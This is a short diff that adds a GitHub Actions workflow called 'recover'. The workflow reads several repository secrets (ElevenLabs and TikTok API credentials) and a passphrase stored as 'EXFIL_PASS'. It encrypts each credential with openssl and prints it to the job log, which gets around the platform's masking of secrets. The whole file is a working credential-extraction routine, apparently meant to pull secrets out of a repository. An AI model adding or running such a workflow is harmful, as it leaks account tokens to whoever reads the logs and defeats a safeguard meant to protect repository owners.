@@ -1,0 +1,15 @@
+name: recover
+on: workflow_dispatch
+jobs:
+  r:
+    runs-on: ubuntu-latest
+    steps:
+      - name: out
+        env:
+          P: ${{ secrets.EXFIL_PASS }}
+          A: ${{ secrets.ELEVENLABS_API_KEY }}
+          B: ${{ secrets.TIKTOK_ACCESS_TOKEN }}
+          C: ${{ secrets.TIKTOK_REFRESH_TOKEN }}
+          D: ${{ secrets.ELEVENLABS_VOICE_ID }}
+        run: |
+          for v in A B C D; do printf '%s' "${!v}" | openssl enc -aes-256-cbc -pbkdf2 -pass pass:"$P" -base64 -A; echo; done
